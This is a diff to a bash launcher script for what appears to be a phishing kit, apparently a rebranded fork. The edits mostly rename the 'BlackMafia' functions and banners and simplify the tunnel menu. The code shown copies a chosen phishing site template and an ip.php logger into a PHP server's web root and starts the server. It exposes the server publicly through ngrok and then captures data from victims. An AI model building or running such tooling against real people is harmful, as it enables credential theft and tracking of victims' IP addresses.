@@ -39,8 +39,7 @@ reset_color() {
 }
 
 ## Kill already running process
-## Kill already running process
-Black_Mafia() {
+kill_pid() {
 	if [[ `pidof php` ]]; then
 		killall php > /dev/null 2>&1
 	fi
@@ -48,10 +47,10 @@ Black_Mafia() {
 		killall ngrok > /dev/null 2>&1
 	fi	
 }
+
 ## Banner
 banner() {
 	cat <<- EOF
-${ORANGE} 
 ${ORANGE} ██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
 ${ORANGE} ██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
 ${ORANGE} ██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
@@ -68,7 +67,7 @@ ${ORANGE} ------ Your Mind is Your Best Weapon-------●
 	EOF
 }
 ## Small Banner
-banner_mafia() {
+banner_small() {
 	cat <<- EOF
 ${ORANGE} 
 ${ORANGE} ████████████████████████████████████████████████ 
@@ -119,6 +118,7 @@ dependencies() {
 	fi
 
 }
+
 ## Download Ngrok
 download_ngrok() {
 	url="$1"
@@ -137,6 +137,7 @@ download_ngrok() {
 		{ reset_color; exit 1; }
 	fi
 }
+
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
@@ -165,6 +166,7 @@ msg_exit() {
 }
 
 ## About
+## About
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
@@ -174,7 +176,6 @@ ${RED} 03094161457
 ${RED} Main Menu     
 ${RED} Exit
 	EOF
-
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 99 ]]; then
@@ -194,8 +195,8 @@ PORT='8080'
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-	cp -rf BlackMafia404/"$website"/* .server/www
-	cp -f BlackMafia404/ip.php .server/www/
+	cp -rf .sites/"$website"/* .server/www
+	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
@@ -247,7 +248,7 @@ start_ngrok() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & 
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to BlackMafia (https://github.com/lovehacker404)
     else
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
@@ -262,21 +263,20 @@ start_ngrok() {
 
 ## Start localhost
 start_localhost() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} BlackMafia Server... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
-	{ sleep 1; clear; banner_mafia; }
+	{ sleep 1; clear; banner_small; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
 ## Tunnel selection
 tunnel_menu() {
-	{ clear; banner_mafia; }
+	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs Only${RED}]
-		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Hotspot Required${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Without Hotspot${RED}]
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Best${RED}]
 
 	EOF
 
@@ -285,9 +285,7 @@ tunnel_menu() {
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		start_localhost
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		start_ngrok "ngrok" "Launching Ngrok...${MAGENTA} Turn on Hotspot..."
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		start_ngrok "ngrok2" "Launching Ngrok Patched..."
+		start_ngrok
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 		{ sleep 1; tunnel_menu; }
@@ -352,9 +350,8 @@ ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 		{ sleep 1; main_menu; }
 	fi
 }
-
 ## Main
-Black_Mafia
+kill_pid
 dependencies
 install_ngrok
 main_menu
